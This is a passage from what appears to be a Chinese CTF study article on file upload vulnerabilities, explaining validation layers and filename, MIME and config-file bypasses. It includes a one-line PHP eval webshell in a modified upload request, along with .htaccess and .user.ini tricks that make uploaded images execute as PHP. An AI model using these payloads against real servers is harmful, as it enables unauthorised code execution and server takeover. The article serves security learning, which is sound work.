+<li><a href="#%E4%BA%94%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">服务端白名单绕过</a></li>
+<li><a href="#%E5%85%AD%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">解析漏洞</a></li>
+<li><a href="#%E4%B8%83%E5%86%85%E5%AE%B9%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E5%9B%BE%E7%89%87%E9%A9%AC%E4%B8%8E%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">内容校验绕过（图片马与二次渲染）</a></li>
+<li><a href="#%E5%85%AB%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">逻辑漏洞</a></li>
+<li><a href="#%E4%B9%9D%E9%85%8D%E5%90%88%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E">配合其他漏洞</a></li>
+<li><a href="#%E5%8D%81%E5%AE%9E%E6%88%98%E6%8E%92%E6%9F%A5%E6%B5%81%E7%A8%8Bchecklist">实战排查流程（Checklist）</a></li>
+<li><a href="#%E5%8D%81%E4%B8%80%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">防御措施</a></li>
+<li><a href="#%E5%8D%81%E4%BA%8C%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA%E4%B8%8E%E5%B7%A5%E5%85%B7">练习靶场与工具</a></li>
+</ol><hr></section>
+<section><h2 id="一漏洞本质与原理">一、漏洞本质与原理<a class="anchor" href="#一漏洞本质与原理"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><p>文件上传漏洞（File Upload Vulnerability）是指：</p><blockquote>
+<p>Web应用在处理用户上传文件时，没有对上传文件进行严格限制，导致攻击者可以上传恶意文件并执行，从而获得服务器权限。</p>
+<p>漏洞上传：</p>
+<div class="expressive-code"><link rel="stylesheet" href="/_astro/ec.1w7nu.css"><script type="module" src="/_astro/ec.g1fg5.js"></script><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:9ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">攻击者上传木马文件</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">↓</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">服务器保存</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">↓</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">访问木马文件</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">↓</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">执行恶意代码</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">↓</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">控制服务器</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div>
+</blockquote><p>其实有个需要注意的点就是：</p><p><strong>文件上传题不只是想办法传一个 PHP 文件。文件以什么名字保存、保存到哪、能不能访问、最后会被谁处理，这几处都可能出问题。</strong></p><p>大致过程：</p><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:38ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">找校验点 → 让文件落地 → 找到文件路径 → 想办法触发 → 拿到题目目标</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>上传成功和代码执行是两回事。文件只能下载，和文件能被 PHP 等 解释，差别很大。常见触发点如下：</p><div class="table-wrapper">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>触发方式</th><th>说明</th></tr></thead><tbody><tr><td>直接访问</td><td>上传目录可访问且可执行脚本，直接访问 <code>shell.php</code></td></tr><tr><td>文件包含</td><td>图片马（内容伪造为图片，尾部夹带代码）配合 LFI 触发</td></tr><tr><td>解析差异</td><td>利用 Apache / Nginx / IIS 的历史版本或错误配置形成解释链</td></tr><tr><td>配置文件</td><td>在服务器允许用户级配置时，用 <code>.htaccess</code> / <code>.user.ini</code> 改变解析行为</td></tr><tr><td>命令拼接</td><td>文件名进入系统命令，配合命令注入</td></tr></tbody></table></div><hr></section>
+<section><h2 id="二校验机制总览">二、校验机制总览<a class="anchor" href="#二校验机制总览"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><p>遇到“上传失败”先别急着换后缀，先看看拦截发生在哪一层：</p><div class="table-wrapper">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>校验层</th><th>校验内容</th><th>典型绕过</th></tr></thead><tbody><tr><td>扩展名（黑名单）</td><td>禁止 <code>.php .jsp .asp</code> 等</td><td>大小写、双写、已配置的等价后缀、配置文件</td></tr><tr><td>扩展名（白名单）</td><td>只允许 <code>.jpg .png .gif</code></td><td>需要解析差异、文件包含等组合缺陷</td></tr><tr><td>MIME 类型</td><td><code>Content-Type: image/png</code></td><td>改包伪造</td></tr><tr><td>文件头 / 内容</td><td>校验文件魔术字节或尝试解码</td><td>伪造文件头、合法图片载荷、二次渲染差异</td></tr><tr><td>大小 / 数量</td><td>限制体积与个数</td><td>多文件参数污染、压缩包</td></tr><tr><td>逻辑层</td><td>先存后校验、落地目录可控</td><td>条件竞争、路径穿越、文件覆盖</td></tr></tbody></table></div><p>做题感受就是</p><p>最好一次只改一个地方。不然扩展名、MIME 和文件内容一起改，很难看出到底是哪一步起作用</p><hr></section>
+<section><h2 id="三前端校验绕过">三、前端校验绕过<a class="anchor" href="#三前端校验绕过"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><p>常用做法：</p><ol>
+<li><strong>禁用或修改 JS</strong>：禁用 JavaScript，或在 DevTools 中修改校验函数和事件处理器。</li>
+<li><strong>直接改包</strong>：用 Burp Suite 或 Yakit 拦截上传请求，修改 <code>filename</code> 与 <code>Content-Type</code> 字段：</li>
+</ol><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:66ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">原始请求：</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">POST /upload HTTP/1.1</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">------WebKitFormBoundary</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Content-Disposition: form-data; name="file"; filename="a.jpg"</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Content-Type: image/jpeg</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">&#x3C;?php @eval($_POST['1']); ?></span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">修改为：</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">------WebKitFormBoundary</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Content-Disposition: form-data; name="file"; filename="a.php"</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Content-Type: image/jpeg</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><hr></section>
+<section><h2 id="四服务端黑名单绕过">四、服务端黑名单绕过<a class="anchor" href="#四服务端黑名单绕过"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><p>黑名单题先看它怎么取后缀、怎么比较、过滤几次。下面这些是常见测试项，但都吃环境，不能看到 payload 就直接套。</p><section><h3 id="1-大小写绕过">1. 大小写绕过<a class="anchor" href="#1-大小写绕过"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:47ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.php  →  shell.pHp / shell.Php / SHELL.PHP</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>只在黑名单区分大小写、后端 handler 又能认混合大小写时有用。Windows 文件系统通常不区分大小写，Linux 通常区分；最后还是看 Web 服务器怎么配。</p></section><section><h3 id="2-双写绕过">2. 双写绕过<a class="anchor" href="#2-双写绕过"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:43ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.pphphp  →  过滤删掉中间的 "php" →  shell.php</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>对应 <code>str_ireplace("php", "", $name)</code> 这类只替换一次的写法。如果循环过滤，双写一般没用。</p></section><section><h3 id="3-末尾点空格与-ntfs-ads">3. 末尾点、空格与 NTFS ADS<a class="anchor" href="#3-末尾点空格与-ntfs-ads"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:56ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.php.       →  部分 Windows 文件 API 规范化为 shell.php</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.php        →  末尾带空格；部分 Windows 文件 API 会去除空格</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">shell.php::$DATA →  在特定 Windows + NTFS 文件 API 组合中指向默认数据流</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>重点是校验时的名字和 Windows 实际落盘后的名字不一致。Linux 会保留末尾点和空格；<code>::$DATA</code> 也只和 NTFS 场景有关，不是通用截断。</p></section><section><h3 id="4-等价后缀">4. 等价后缀<a class="anchor" href="#4-等价后缀"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:49ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">.php   →  .phtml / .php3 / .php4 / .php5 / .pht 等</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>前提是黑名单只封了 <code>.php</code>，而且服务器真的给替代后缀配了 PHP handler。不要默认 <code>.phtml</code>、<code>.php5</code> 一定能执行；<code>.phps</code> 很多时候只是源码高亮，甚至没有配置。</p></section><section><h3 id="5-用户级配置文件">5. 用户级配置文件<a class="anchor" href="#5-用户级配置文件"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p><strong><code>.htaccess</code>（Apache）</strong>——上传内容为：</p><div class="expressive-code"><figure class="frame" data-language="apache"><figcaption class="header"></figcaption><pre data-language="apache" class="wrap" style="--ecMaxLine:36ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">AddType</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">application/x-httpd-php</span><span style="--0:#24292E;--1:#E1E4E8"> .jpg</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>能否生效看两个地方：Apache 是否允许 <code>AllowOverride FileInfo</code>，当前 PHP handler 是否接受这个映射。换成 PHP-FPM 或禁掉覆盖后，这招经常失效。</p><p><strong><code>.user.ini</code></strong>——上传内容为：</p><div class="expressive-code"><figure class="frame" data-language="ini"><figcaption class="header"></figcaption><pre data-language="ini" class="wrap" style="--ecMaxLine:35ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">auto_prepend_file</span><span style="--0:#24292E;--1:#E1E4E8">=filename //包含在文件头</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">auto_append_file</span><span style="--0:#24292E;--1:#E1E4E8">=filename //包含在文件尾</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>这个点一开始容易绕晕，可以把它拆成“目录级配置 + 触发 PHP 文件 + 被包含文件”三部分来看</p><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:26ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">例如：</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">/upload/</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">├── .user.ini</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">├── 1.png</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">└── index.php</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">访问：</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">http://target/upload/</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">实际流程是：</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">GET /upload/</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">→ Web 服务器寻找默认首页</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">→ 找到 /upload/index.php</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">→ 把 index.php 交给 PHP-FPM</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">→ PHP 读取 /upload/.user.ini</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">→ 先包含 /upload/1.png</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">→ 再执行 /upload/index.php</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 